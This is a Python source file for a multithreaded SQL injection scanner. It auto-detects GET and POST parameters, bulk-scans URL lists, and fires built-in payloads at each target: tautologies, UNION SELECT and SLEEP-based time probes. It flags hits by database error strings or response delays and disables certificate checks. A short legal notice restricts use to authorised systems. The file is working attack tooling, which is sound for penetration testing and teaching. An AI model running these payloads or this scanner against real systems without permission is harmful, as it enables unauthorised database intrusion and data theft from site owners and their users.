#!/usr/bin/env python3
"""
SQL Injection Testing Tool 2.1
==============================
Author : gurmeet kaur
License: MIT

What’s new (v 2.1)
------------------
* **Auto‑detect** every GET/POST parameter (no `FUZZ` needed).
* **Bulk scan** URLs from `--url-file` (one URL per line, `#` comments ok).
* **Graceful error handling & zero warnings** (suppresses SSL warnings;
  catches `requests` errors).
* **Unit‑test suite** runs automatically if you launch the script with **no
  args** – perfect for CI.
* **Cleaner output** and color‑coded status (optional `--color`).

Usage examples
--------------
```bash
# Auto‑detect on one URL
python sql_injection_tester.py -u "https://tld/items.php?id=1&cat=2" -A -v

# POST form auto detect
python sql_injection_tester.py -u "https://tld/login.php" -X POST -d "u=admin&p=123" -A

# Scan many targets from a file (30 threads)
python sql_injection_tester.py --url-file targets.txt -A -t 30
```

> **Legal notice**  Use this tool **only** on systems you own or have
> permission to test.
"""
from __future__ import annotations

import argparse
import concurrent.futures as cf
import random
import re
import string
import sys
import time
import urllib.parse as up
from pathlib import Path
from typing import Iterable, List, Sequence, Tuple

import requests
import unittest

# ──────────────────────────────────────────────────────────────────────────────
# Global config & constants
# ──────────────────────────────────────────────────────────────────────────────

# Silence SSL warnings (we deliberately scan with verify=False)
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HEADERS_TEMPLATE = {"User-Agent": "SQLInjector/2.1 (+https://example.com)"}
TIMEOUT = 10  # s

# Classic payloads (error / boolean / union / time)
DEFAULT_PAYLOADS: List[str] = [
    "'", '"', "' OR '1'='1", '" OR "1"="1', "'--", "'/*", ") OR ('1'='1",
    "1 OR 1=1", "' OR 'a'='a", "admin'--",
    "1') AND 1=1-- -", "1') AND 1=2-- -",
    "' UNION SELECT 1,2,3-- -", "' UNION SELECT NULL-- -",
    "' AND SLEEP(5)-- -", "') AND SLEEP(5)-- -",
]

ERROR_REGEX = re.compile(
    r"(SQL syntax|Warning: mysql_|Unclosed quotation mark|ODBC SQL|Microsoft SQL|SQLite\\/JDBC|PG::|supplied argument is not a valid PostgreSQL|near \"|PdoMysql|Fatal error|SqlException)",
    re.I,
)

# ──────────────────────────────────────────────────────────────────────────────
# Arg‑parsing helpers
# ──────────────────────────────────────────────────────────────────────────────

def parse_args(argv: Sequence[str] | None = None) -> argparse.Namespace | None:
    """Return parsed args ‑ or *None* if unit tests were run instead."""
    p = argparse.ArgumentParser(
        prog="sql_injection_tester.py",
        description="SQLi scanner with auto‑detect and bulk mode.",
    )

    src = p.add_mutually_exclusive_group(required=True)
    src.add_argument("-u", "--url", help="Single target URL (FUZZ optional if -A)")
    src.add_argument("--url-file", help="File containing URLs (one per line)")

    p.add_argument("-X", "--method", default="GET", choices=["GET", "POST"], help="HTTP verb")
    p.add_argument("-d", "--data", help="POST body (FUZZ optional if -A)")
    p.add_argument("-H", "--header", action="append", help="Extra header e.g. -H 'Cookie: ID=1'")
    p.add_argument("-w", "--wordlist", help="Custom payload list file")
    p.add_argument("-t", "--threads", type=int, default=10, help="Concurrent threads (default 10)")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    p.add_argument("-A", "--auto-detect", action="store_true", help="Auto‑detect params (ignore FUZZ)")
    p.add_argument("--color", action="store_true", help="Colorize output")

    if argv is None:
        argv = sys.argv[1:]

    # Run unit tests automatically if no CLI args provided
    if not argv:
        unittest.main(argv=[''], exit=False)
        return None

    return p.parse_args(argv)

# ──────────────────────────────────────────────────────────────────────────────
# Variant builders
# ──────────────────────────────────────────────────────────────────────────────

def build_variants(url: str, body: str | None, auto: bool) -> List[Tuple[str, str | None]]:
    """Generate *all* (url, body) pairs with a FUZZ placeholder."""
    variants: list[Tuple[str, str | None]] = []

    if auto:
        parsed = up.urlsplit(url)
        qs = up.parse_qsl(parsed.query, keep_blank_values=True)
        # GET params
        if qs:
            for i, (k, v) in enumerate(qs):
                alt_qs = qs.copy(); alt_qs[i] = (k, "FUZZ")
                new_url = up.urlunsplit(parsed._replace(query=up.urlencode(alt_qs, doseq=True)))
                variants.append((new_url, body))
        else:
            variants.append((url + ("?i=FUZZ" if "?" not in url else "&i=FUZZ"), body))
        # POST params
        if body:
            pairs = up.parse_qsl(body, keep_blank_values=True)
            for i, (k, v) in enumerate(pairs):
                alt_pairs = pairs.copy(); alt_pairs[i] = (k, "FUZZ")
                variants.append((url, up.urlencode(alt_pairs)))
    else:
        # Assume user placed FUZZ manually
        variants.append((url, body))

    return variants


def enumerate_targets(ns: argparse.Namespace) -> List[Tuple[str, str | None]]:
    urls: Iterable[str]
    if ns.url_file:
        content = Path(ns.url_file).read_text(encoding="utf-8", errors="ignore").splitlines()
        urls = (u.strip() for u in content if u.strip() and not u.startswith("#"))
    else:
        urls = [ns.url]

    variants: list[Tuple[str, str | None]] = []
    for u in urls:
        variants += build_variants(u, ns.data, ns.auto_detect)
    return variants

# ──────────────────────────────────────────────────────────────────────────────
# Network helpers
# ──────────────────────────────────────────────────────────────────────────────

def build_headers(hdrs: List[str] | None) -> dict:
    headers = HEADERS_TEMPLATE.copy()
    if hdrs:
        for h in hdrs:
            if ":" not in h:
                print(f"[!] Malformed -H value ignored: {h}")
                continue
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    return headers


def load_payloads(path: str | None) -> List[str]:
    if path:
        try:
            return [l.rstrip() for l in Path(path).read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
        except Exception as e:
            print(f"[!] Wordlist error → {e}. Using defaults.")
    return DEFAULT_PAYLOADS


def request_once(url: str, method: str, body: str | None, hdrs: dict) -> Tuple[int, str, float]:
    """Return (status_code, text, elapsed_s)."""
    start = time.time()
    try:
        if method == "GET":
            r = requests.get(url, headers=hdrs, timeout=TIMEOUT, verify=False)
        else:
            r = requests.post(url, headers=hdrs, data=body, timeout=TIMEOUT, verify=False)
    except requests.RequestException as exc:
        return 0, str(exc), time.time() - start
    return r.status_code, r.text, time.time() - start

# ──────────────────────────────────────────────────────────────────────────────
# Scan engine
# ──────────────────────────────────────────────────────────────────────────────

def scan_job(args: tuple):
    url, body, method, hdrs, payload = args
    url_fuzzed = url.replace("FUZZ", up.quote(payload, safe=""))
    body_fuzzed = body.replace("FUZZ", payload) if body else None
    code, text, elapsed = request_once(url_fuzzed, method, body_fuzzed, hdrs)
    err = bool(ERROR_REGEX.search(text))
    return url, body, payload, code, len(text), elapsed, err


def run_scan(ns: argparse.Namespace) -> None:
    targets = enumerate_targets(ns)
    payloads = load_payloads(ns.wordlist)
    headers = build_headers(ns.header)

    print(f"[*] Scanning {len(targets)} variant(s) × {len(payloads)} payloads …")

    with cf.ThreadPoolExecutor(max_workers=ns.threads) as ex:
        jobs = (
            (u, b, ns.method, headers, p) for u, b in targets for p in payloads
        )
        results = list(ex.map(scan_job, jobs))

    # Collect findings
    hits: list[str] = []
    for url, body, payload, code, length, elapsed, err in results:
        suspicious = err or (elapsed > 4.5 and "SLEEP(" in payload)
        if suspicious:
            line = f"{url} | {payload[:25]:<25} → {code} {length}B {elapsed:.2f}s"
            if body:
                line += f" | POST={body}"
            hits.append(line)

    if not hits:
        print("[-] No obvious SQLi indicators found (not a guarantee).")
        return

    print("\n[+] Potential SQL injection indicators:")
    for h in hits:
        print("  " + h)

# ──────────────────────────────────────────────────────────────────────────────
# Unit tests
# ──────────────────────────────────────────────────────────────────────────────

class TestHelpers(unittest.TestCase):
    def test_variant_generation_query(self):
        v = build_variants("http://x.tld/a.php?a=1&b=2", None, True)
        urls = [u for u, _ in v]
        self.assertIn("a=FUZZ&b=2", urls[0])
        self.assertIn("a=1&b=FUZZ", urls[1])
        self.assertEqual(len(v), 2)

    def test_variant_generation_body(self):
        v = build_variants("http://x.tld", "u=Bob&p=123", True)
        bodies = [b for _, b in v]
        self.assertIn("u=FUZZ&p=123", bodies)
        self.assertIn("u=Bob&p=FUZZ", bodies)

    def test_payload_load_default(self):
        self.assertIn("'", load_payloads(None))

    def test_header_parse(self):
        hdr = build_headers(["X-A: 1", "Y-B: 2"])
        self.assertEqual(hdr["X-A"], "1")
        self.assertEqual(hdr["Y-B"], "2")

# ──────────────────────────────────────────────────────────────────────────────
# Main entrypoint
# ──────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    ns = parse_args()
    if ns:
        try:
            run_scan(ns)
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
